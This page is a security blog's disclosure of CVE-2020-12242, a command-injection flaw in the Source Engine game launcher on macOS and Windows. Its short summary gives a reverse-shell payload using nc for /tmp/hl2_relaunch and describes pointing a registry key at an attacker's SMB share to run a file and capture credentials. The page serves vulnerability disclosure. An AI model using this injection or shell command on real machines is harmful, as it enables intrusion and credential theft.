<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>0xEm.maSource Engine LPE/Arbitrary Code Execution; CVE-2020-12242</title><!-- Begin Jekyll SEO tag v2.6.1 -->
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Source Engine LPE/Arbitrary Code Execution; CVE-2020-12242" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Code Execution within Source Engine Game CVE: CVE-2020-12242 Affected Products" />
<meta property="og:description" content="Code Execution within Source Engine Game CVE: CVE-2020-12242 Affected Products" />
<link rel="canonical" href="http://0.0.0.0:4000/cve/2020/04/28/Source-hl2-relaunch-exec.html" />
<meta property="og:url" content="http://0.0.0.0:4000/cve/2020/04/28/Source-hl2-relaunch-exec.html" />
<meta property="og:site_name" content="0xEm.ma" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-04-28T01:16:00+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/cve/2020/04/28/Source-hl2-relaunch-exec.html"},"url":"http://0.0.0.0:4000/cve/2020/04/28/Source-hl2-relaunch-exec.html","description":"Code Execution within Source Engine Game CVE: CVE-2020-12242 Affected Products","headline":"Source Engine LPE/Arbitrary Code Execution; CVE-2020-12242","dateModified":"2020-04-28T01:16:00+00:00","datePublished":"2020-04-28T01:16:00+00:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<meta name="google-site-verification" content="IOeX_NfumEuoswqMTWnRG5yDlZdUxa1tcDx6gM-rgaQ" /><link rel="stylesheet" type="text/css" href="/assets/main-dark.css"><meta content="0xEm.ma" property="og:site_name">

  <meta content="Source Engine LPE/Arbitrary Code Execution; CVE-2020-12242" property="og:title">


  <meta content="article" property="og:type">


  <meta content="An infosec blog made by Emma © 2019 - 2021 Emma S. All Rights Reserved" property="og:description">


  <meta content="http://0.0.0.0:4000/cve/2020/04/28/Source-hl2-relaunch-exec.html" property="og:url">


  <meta content="2020-04-28T01:16:00+00:00" property="article:published_time">
  <meta content="http://0.0.0.0:4000/about/" property="article:author">


  <meta content="/img/logo-high-resolution.png" property="og:image">


  
  <meta content="CVE" property="article:section">
  


  

  <script type="text/javascript">
    window._mNHandle = window._mNHandle || {};
    window._mNHandle.queue = window._mNHandle.queue || [];
    medianet_versionId = "3121199";
</script>
<script src="https://contextual.media.net/dmedianet.js?cid=8CU15U4A5" async="async"></script>
</head>
<body>
    <div class="container"><header>
  <div class="menu">
    <ul><li><a href="/">/index</a></li><li><a href="/about/">/about-me</a></li><li><a href="/contact/index.html">/contact-me</a></li><li><a href="/pgp/">/pgp-key</a></li></ul>
  </div>
</header>
<main>
      <h1 id="code-execution-within-source-engine-game">Code Execution within Source Engine Game</h1>
<hr />
<h4 id="cve-cve-2020-12242">CVE: CVE-2020-12242</h4>
<hr />
<h4 id="affected-products">Affected Products</h4>
<hr />

<h5 id="tested">Tested:</h5>

<p>CS:GO BuildID: 4937372 -&gt; Current</p>

<p>TF2 BuildID: 4871679 -&gt; Current</p>

<p>Garry’s Mod BuildID: 4803834 -&gt; Current</p>

<p>Half Life 2 BuildID: 4233302 - &gt; Current</p>

<p>Note: this vulnerability seems to date back further then the listed build numbers, however i have only tested back to them</p>
<h4 id="notes">Notes:</h4>

<p>This seems to be a issue within the source engine itself and should be present within all source games. However I have only tested the games listed above.</p>

<hr />

<h4 id="vulnerability-explanation-in-short">Vulnerability Explanation in Short</h4>

<p>TL;DR Within MacOS place <code class="highlighter-rouge">";nc -e /bin/bash ip port"</code>(or whatever you want for shell) into <code class="highlighter-rouge">/tmp/hl2_relaunch</code>, open and close CS:GO and you have a shell on MacOS as whoever runs the game. On Windows add a registry key named <code class="highlighter-rouge">Relaunch URL</code> to <code class="highlighter-rouge">Computer\HKEY_CURRENT_USER\Software\Valve\Source</code>, however we can only call programs, thankfully we can use SMB/Any UNC Path to call a remote file(and get creds while were at it), so set it to \\ip\share\file and boom</p>

<h4 id="more-technical-explanation">More Technical Explanation</h4>

<p>Within The CS:GO Source code leak, you can find the affected file at launcher/launcher.cpp 
<img src="https://emma.is-a-bad-waifu.com/6184nQ4.png" width="100%" />
Lines 1939 -&gt; 1974 are the affected functions. See screenshot of code above.</p>

<p>However on line 98, the file is defined for OSX</p>

<p><img src="https://emma.is-a-bad-waifu.com/5QWaZMR.png" alt="OSX File Selection" /></p>

<p>On OSX, the launcher checks to see if the file ‘/tmp/hl2_relaunch’ exists, if it does then it creates the szCMD variable. If the file has stuff within it(it 99.9% of the time will), then it will add ‘open’ too the start and send it out as a system call. The issue with this is that their is <em>no</em> input validation. Meaning as I showed before, we can just add <code class="highlighter-rouge">;</code> and it’ll execute anything we wish after.</p>

<p>For Windows, it checks to see if the registry key HKEY_Current_User\Software\Valve\Source, exists, then if it does if ReLaunch URL Exists within it, if it does call the ShellExecute Open function with the value of the registry key(Docs for shell execute <a href="https://docs.microsoft.com/en-us/windows/win32/shell/launch">here</a>), this means itll run a executable, or open the attached program. and since the values “0, 0” are set we are unable to add parameters. However we are able to specify a remote SMB Path, so if we set the registry key to a SMB server we control containing a malicious file (I tested with a .bat running a rev shell command), using this method we can also fetch users credentials.</p>

<p>As a additional note this was a collaborative effort between Me(0xEmma), <a href="https://bugb.yt/blog/cve-2020-12242">BugByt3</a> and <a href="https://sebastianpc.tech/2020/04/27/CVE-2020-12242-Source-Engine-privilege-escalation.html">sebastianpc</a>.</p>


    </main><footer>
  <center><br><style>.bmc-button img{height: 34px !important;width: 35px !important;margin-bottom: 1px !important;box-shadow: none !important;border: none !important;vertical-align: middle !important;}.bmc-button{padding: 7px 15px 7px 10px !important;line-height: 35px !important;height:51px !important;text-decoration: none !important;display:inline-flex !important;color:#ffffff !important;background-color:#F471FF !important;border-radius: 5px !important;border: 1px solid transparent !important;padding: 7px 15px 7px 10px !important;font-size: 20px !important;letter-spacing:-0.08px !important;box-shadow: 0px 1px 2px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;margin: 0 auto !important;font-family:Lato, sans-serif !important;-webkit-box-sizing: border-box !important;box-sizing: border-box !important;}.bmc-button:hover, .bmc-button:active, .bmc-button:focus {-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;text-decoration: none !important;box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;opacity: 0.85 !important;color:#ffffff !important;}</style><link href="https://fonts.googleapis.com/css?family=Lato&subset=latin,latin-ext" rel="stylesheet"><a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/G3TLc5nV9"><img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Support my work"><span style="margin-left:5px;font-size:19px !important;">Support my work</span></a><br><img src="https://hitcounter.pythonanywhere.com/count/tag.svg?url=0xem.ma" alt="Hits"><br><script data-ad-client="ca-pub-1524550373781171" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><br></center>
</footer>
</div>
    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-110725432-3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-110725432-3');
</script>


  </body>
</html>
